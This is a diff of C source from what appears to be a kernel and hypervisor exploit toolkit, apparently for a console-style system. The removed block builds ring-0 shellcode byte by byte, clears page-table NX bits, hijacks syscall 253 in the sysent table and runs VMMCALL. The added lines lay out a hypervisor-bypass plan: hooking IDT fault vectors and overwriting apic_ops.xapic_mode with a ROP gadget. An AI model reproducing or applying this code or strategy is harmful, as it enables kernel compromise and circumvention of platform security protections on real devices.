@@ -3726,143 +3726,48 @@ ring3_fallback:
                 printf("\n");
                 fflush(stdout);
 
-                /* ─── Phase 4: SVME=1 — VMMCALL probe (safe) ─── */
-                printf("=============================================\n");
-                printf("  Ring-0 Phase 4: VMMCALL Probe (SVME=1)\n");
-                printf("=============================================\n\n");
-                printf("[*] EFER.SVME=1 detected — probing VMMCALL from ring 0.\n");
-                printf("[*] VMMCALL with RAX=0 is the safest probe.\n");
-                printf("[*] Expected: #VMEXIT → HV handles → returns to guest.\n");
-                printf("[*] Risk: HV may kill guest on unrecognized VMMCALL.\n");
-                fflush(stdout);
-
+                /* ─── Phase 4: VMMCALL analysis (NO direct probe) ─── */
                 /*
-                 * Build a VMMCALL probe shellcode:
-                 *   mov rdi, output_kva
-                 *   movl $KMOD_MAGIC_lo, (%rdi)     ; mark alive
-                 *   movl $KMOD_MAGIC_hi, 4(%rdi)
-                 *   mov eax, 0                       ; VMMCALL function 0
-                 *   vmmcall                           ; 0F 01 D9
-                 *   movl $0x56434F4B, 8(%rdi)        ; "VCOK" — survived
-                 *   mov [rdi+16], rax                 ; save RAX return
-                 *   xor eax, eax
-                 *   ret
+                 * DISABLED: Direct VMMCALL probe causes kernel panic.
+                 *
+                 * The HV intercepts VMMCALL (#VMEXIT) and injects #UD or #GP
+                 * back into the guest for unrecognized hypercall numbers.
+                 * Without a proper IDT-based fault handler installed first,
+                 * any fault in kernel mode → kernel panic.
+                 *
+                 * Safe VMMCALL probing requires:
+                 *   1. Install custom #UD/#GP handlers in IDT (vectors 6, 13)
+                 *   2. Set up a recovery trampoline (longjmp-style)
+                 *   3. Only then issue VMMCALL
+                 *   4. If fault fires, handler recovers; if not, VMMCALL survived
+                 *
+                 * Alternative: Use the apic_ops suspend/resume path (flatz method)
+                 * which executes VMMCALL during a window where the HV is inactive.
                  */
-                {
-                    uint8_t vc_sc[64];
-                    int vp = 0;
-
-                    /* mov rdi, output_kva (result_kva) */
-                    vc_sc[vp++] = 0x48; vc_sc[vp++] = 0xBF;
-                    memcpy(&vc_sc[vp], &result_kva, 8); vp += 8;
-
-                    /* Clear buffer: movq $0, (%rdi) */
-                    vc_sc[vp++] = 0x48; vc_sc[vp++] = 0xC7;
-                    vc_sc[vp++] = 0x07;
-                    vc_sc[vp++] = 0; vc_sc[vp++] = 0;
-                    vc_sc[vp++] = 0; vc_sc[vp++] = 0;
-
-                    /* Write pre-vmmcall marker: movl $0x564D4231, (%rdi)
-                     * "VMB1" = VMMCALL Before 1 */
-                    vc_sc[vp++] = 0xC7; vc_sc[vp++] = 0x07;
-                    uint32_t pre_mark = 0x564D4231; /* "VMB1" */
-                    memcpy(&vc_sc[vp], &pre_mark, 4); vp += 4;
-
-                    /* xor eax, eax (VMMCALL function 0) */
-                    vc_sc[vp++] = 0x31; vc_sc[vp++] = 0xC0;
-
-                    /* xor ecx, ecx */
-                    vc_sc[vp++] = 0x31; vc_sc[vp++] = 0xC9;
-
-                    /* xor edx, edx */
-                    vc_sc[vp++] = 0x31; vc_sc[vp++] = 0xD2;
-
-                    /* vmmcall: 0F 01 D9 */
-                    vc_sc[vp++] = 0x0F; vc_sc[vp++] = 0x01; vc_sc[vp++] = 0xD9;
-
-                    /* Write post-vmmcall marker: movl $0x564D4F4B, 4(%rdi)
-                     * "VMOK" = VMMCALL survived */
-                    vc_sc[vp++] = 0xC7; vc_sc[vp++] = 0x47; vc_sc[vp++] = 0x04;
-                    uint32_t post_mark = 0x564D4F4B; /* "VMOK" */
-                    memcpy(&vc_sc[vp], &post_mark, 4); vp += 4;
-
-                    /* Save RAX (return from VMMCALL): mov %rax, 8(%rdi) */
-                    vc_sc[vp++] = 0x48; vc_sc[vp++] = 0x89;
-                    vc_sc[vp++] = 0x47; vc_sc[vp++] = 0x08;
-
-                    /* xor eax, eax; ret */
-                    vc_sc[vp++] = 0x31; vc_sc[vp++] = 0xC0;
-                    vc_sc[vp++] = 0xC3;
-
-                    printf("[*] VMMCALL probe shellcode: %d bytes\n", vp);
-
-                    /* Clear shared buffer */
-                    uint8_t vc_zero[32];
-                    memset(vc_zero, 0, sizeof(vc_zero));
-                    kernel_copyin(vc_zero, g_dmap_base + cpu_pa, 32);
-
-                    /* Save + write shellcode */
-                    uint8_t vc_backup[64];
-                    kernel_copyout(g_dmap_base + target_pa, vc_backup, vp);
-                    kernel_copyin(vc_sc, g_dmap_base + target_pa, vp);
-
-                    /* Clear NX+G, hook sysent, call */
-                    kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
-                    kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
-                    kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);
-
-                    printf("[*] Calling syscall(253) — VMMCALL in ring 0...\n");
-                    fflush(stdout);
-                    errno = 0;
-                    long vc_ret = syscall(253);
-                    int vc_err = errno;
-                    printf("    syscall(253) returned: %ld, errno=%d\n",
-                           vc_ret, vc_err);
-
-                    /* Restore everything */
-                    kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
-                    kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
-                    kernel_copyin(vc_backup, g_dmap_base + target_pa, vp);
-                    printf("[*] All restored.\n");
-
-                    /* Read results */
-                    uint32_t vc_pre, vc_post;
-                    uint64_t vc_rax;
-                    kernel_copyout(g_dmap_base + cpu_pa, &vc_pre, 4);
-                    kernel_copyout(g_dmap_base + cpu_pa + 4, &vc_post, 4);
-                    kernel_copyout(g_dmap_base + cpu_pa + 8, &vc_rax, 8);
-
-                    printf("\n[*] VMMCALL probe results:\n");
-                    printf("    Pre-marker:  0x%08x %s\n", vc_pre,
-                           vc_pre == 0x564D4231 ? "(VMB1 — reached VMMCALL)" :
-                           vc_pre == 0 ? "(zero — shellcode didn't run)" :
-                           "(unexpected)");
-                    printf("    Post-marker: 0x%08x %s\n", vc_post,
-                           vc_post == 0x564D4F4B ? "(VMOK — SURVIVED VMMCALL!)" :
-                           vc_post == 0 ? "(zero — died at VMMCALL)" :
-                           "(unexpected)");
-                    printf("    RAX return:  0x%016lx\n", (unsigned long)vc_rax);
-
-                    if (vc_pre == 0x564D4231 && vc_post == 0x564D4F4B) {
-                        printf("\n[+] ============================================\n");
-                        printf("[+]  VMMCALL SURVIVED! HV returned to guest!\n");
-                        printf("[+] ============================================\n");
-                        printf("[+] RAX out = 0x%lx\n", (unsigned long)vc_rax);
-                        printf("[+] This opens VMMCALL enumeration as attack surface.\n");
-                    } else if (vc_pre == 0x564D4231 && vc_post == 0) {
-                        printf("\n[!] VMMCALL was reached but execution stopped.\n");
-                        printf("    HV intercepted VMMCALL and either:\n");
-                        printf("    - Killed the syscall (returned error)\n");
-                        printf("    - Injected #UD or #GP into guest\n");
-                        if (vc_err != 0)
-                            printf("    errno=%d confirms fault was injected.\n",
-                                   vc_err);
-                    } else if (vc_pre == 0) {
-                        printf("\n[-] Shellcode didn't execute (PTE/hook issue).\n");
-                    }
-                    printf("\n");
-                    fflush(stdout);
+                printf("=============================================\n");
+                printf("  Ring-0 Phase 4: VMMCALL Analysis\n");
+                printf("=============================================\n\n");
+                printf("[*] EFER.SVME=1 confirmed — system runs under AMD SVM HV.\n");
+                printf("[!] Direct VMMCALL probe SKIPPED (causes kernel panic).\n");
+                printf("    HV injects #UD/#GP for unknown hypercalls.\n");
+                printf("    Need IDT fault handler before safe probing.\n\n");
+                printf("[*] Safe VMMCALL strategy (TODO):\n");
+                printf("    1. Hook IDT vector 6 (#UD) and 13 (#GP)\n");
+                printf("    2. Install recovery trampoline in handlers\n");
+                printf("    3. Issue VMMCALL with RAX=0..31\n");
+                printf("    4. If handler fires → HV rejected; if returns → survived\n\n");
+                printf("[*] Alternative: apic_ops suspend/resume path (flatz method)\n");
+                printf("    Overwrite apic_ops.xapic_mode (kdata+offset+0x10)\n");
+                printf("    with ROP gadget, trigger suspend/resume cycle.\n");
+                printf("    Code runs before HV restarts → bypass intercepts.\n");
+                if (apic_best_addr) {
+                    printf("[+] Candidate apic_ops found at 0x%lx\n",
+                           (unsigned long)apic_best_addr);
+                    printf("    xapic_mode would be at 0x%lx (offset +0x10)\n",
+                           (unsigned long)(apic_best_addr + 0x10));
                 }
+                printf("\n");
+                fflush(stdout);
             } else if (buf_check != 0) {
                 printf("[?] Buffer has unexpected value: 0x%lx\n",
                        (unsigned long)buf_check);
